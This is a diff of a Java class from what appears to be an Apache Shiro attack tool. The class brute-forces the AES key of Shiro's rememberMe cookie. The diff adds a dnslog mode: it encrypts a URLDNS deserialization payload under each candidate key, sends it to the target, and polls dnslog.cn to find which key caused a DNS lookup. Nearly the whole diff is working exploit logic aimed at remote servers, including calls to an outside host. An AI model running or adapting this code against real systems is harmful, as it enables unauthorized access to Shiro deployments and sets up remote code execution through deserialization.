@@ -3,6 +3,7 @@ package cn.safe6.core.jobs;
 import cn.safe6.Controller;
 import cn.safe6.core.Constants;
 import cn.safe6.core.ControllersFactory;
+import cn.safe6.payload.URLDNS;
 import cn.safe6.util.HttpClientUtil;
 import cn.safe6.util.PayloadEncryptTool;
 import cn.safe6.util.ShiroTool;
@@ -11,6 +12,12 @@ import org.apache.http.client.methods.CloseableHttpResponse;
 import org.apache.http.util.EntityUtils;
 
 
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.net.HttpURLConnection;
+import java.net.URL;
 import java.util.*;
 import java.util.concurrent.Callable;
 
@@ -43,9 +50,11 @@ public class BurstJob implements Callable<String> {
         int errLen = 0;
         //默认存在 remember
         boolean isExistMB =true;
+
         String rememberMe = paramsContext.get("rmeValue").toString();
 
         try {
+            byte[] payload =ShiroTool.getDetectText();
             Controller.logUtil.printInfoLog("开始爆破默认key",false);
 
             //错误包长度
@@ -85,15 +94,22 @@ public class BurstJob implements Callable<String> {
                     }
                 }
             }
+            Map<String,String> dnslog = getDnslog();
+
 
 
             for (String key : keys) {
                 Controller.logUtil.printInfoLog("检测"+key,false);
                 String encryptData;
+
+                if (paramsContext.get("checkType").toString().contains("dnslog")){
+                    payload = URLDNS.getPayload(key+"."+dnslog.get("url"));
+                }
+
                 if (paramsContext.get("AES").equals(Constants.AES_GCM)){
-                    encryptData = PayloadEncryptTool.AesGcmEncrypt(ShiroTool.getDetectText(),key);
+                    encryptData = PayloadEncryptTool.AesGcmEncrypt(payload,key);
                 }else {
-                    encryptData = PayloadEncryptTool.AesCbcEncrypt(ShiroTool.getDetectText(),key);
+                    encryptData = PayloadEncryptTool.AesCbcEncrypt(payload,key);
                 }
 
                 //请求包header超过8k会报header too large错误
@@ -130,17 +146,25 @@ public class BurstJob implements Callable<String> {
                     Controller.logUtil.getLog().selectPositionCaret(Controller.logUtil.getLog().getText().length());
                 }
 
+                //dnslog
+                if (paramsContext.get("checkType").toString().contains("dnslog")){
+                    String record =getDnsLogRecord(dnslog);
+                    if (record.contains(key)){
+                        Controller.logUtil.printSucceedLog("爆破成功！发现"+key);
+                        controller.aesKey.setText(key);
+                        break;
+                    }
+                }
+
                 //用长度进行第一次判断
                 if (data!=null&&errLen!=data.length()){
                     if (isExistMB&&resHeader.contains(rememberMe)){
                         Controller.logUtil.printSucceedLog("爆破成功！发现"+key);
                         controller.aesKey.setText(key);
                         break;
-                    }else {
-                        Controller.logUtil.printSucceedLog("爆破成功！发现"+key);
-                        controller.aesKey.setText(key);
-                        break;
                     }
+                    Controller.logUtil.printAbortedLog("秘钥错误",false);
+
                 }else {
                     if (isExistMB&&!resHeader.contains(rememberMe)){
                         Controller.logUtil.printSucceedLog("爆破成功！发现"+key);
@@ -149,6 +173,8 @@ public class BurstJob implements Callable<String> {
                     }
                     Controller.logUtil.printAbortedLog("秘钥错误",false);
                 }
+
+
             }
             Controller.logUtil.printInfoLog("爆破结束!",true);
         }catch (Exception e){
@@ -195,6 +221,97 @@ public class BurstJob implements Callable<String> {
     public void setKeys(List<String> keys) {
         this.keys = keys;
     }
+    public Map<String,String> getDnslog(){
+        HttpURLConnection connection = null;
+        InputStream inputStream = null;
+        BufferedReader reader = null;
+        StringBuffer sb = new StringBuffer();
+        Map<String,String> dnslog = null;
 
+        try
+        {
+            connection = (HttpURLConnection)new URL("http://www.dnslog.cn/getdomain.php").openConnection();
+            connection.setRequestMethod("GET");
+            connection.setConnectTimeout(5000);
+            connection.setReadTimeout(5000);
+            connection.connect();
+
+            int responseCode = connection.getResponseCode();
+            if (responseCode == 200) {
+                dnslog = new HashMap<>();
+
+                String sessinoId = connection.getHeaderField("Set-Cookie");
+                sessinoId = sessinoId.split(";")[0];
+
+                inputStream = connection.getInputStream();
+                reader = new BufferedReader(new InputStreamReader(inputStream));
+                String line;
+                while ((line = reader.readLine()) != null) {
+                    sb.append(line);
+                }
+
+                dnslog.put("cookie",sessinoId);
+                dnslog.put("url","http://"+sb.toString());
+                return dnslog;
+            }
+        }
+        catch (IOException e) {
+            e.printStackTrace();
+        } finally {
+            try {
+                if (connection != null) connection.disconnect();
+                if (inputStream != null) inputStream.close();
+                if (reader != null) reader.close();
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+        }
+
+        return dnslog;
+    }
+
+
+    public String getDnsLogRecord(Map<String,String> dnslog) throws Exception{
+        HttpURLConnection connection = null;
+        InputStream inputStream = null;
+        BufferedReader reader = null;
+        StringBuffer sb = new StringBuffer();
+
+        try {
+            connection = (HttpURLConnection)new URL("http://www.dnslog.cn/getrecords.php").openConnection();
+            connection.setRequestMethod("GET");
+            connection.setRequestProperty("Cookie", dnslog.get("cookie"));
+            connection.setRequestProperty("User-Agent","Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36");
+            connection.setRequestProperty("connection", "close");
+            connection.setConnectTimeout(10000);
+            connection.setReadTimeout(10000);
+            connection.connect();
+
+            int responseCode = connection.getResponseCode();
+            String line;
+            if (responseCode == 200) {
+                inputStream = connection.getInputStream();
+                reader = new BufferedReader(new InputStreamReader(inputStream));
+
+                while ((line = reader.readLine()) != null){
+                    sb.append(line);
+                }
+
+            } else {
+                return null;
+            }
+        } finally {
+            try {
+                if (connection != null) connection.disconnect();
+                if (inputStream != null) inputStream.close();
+                if (reader != null) reader.close();
+            }
+            catch (IOException e) {
+                e.printStackTrace();
+            }
+        }
+
+        return sb.toString();
+    }
 
 }
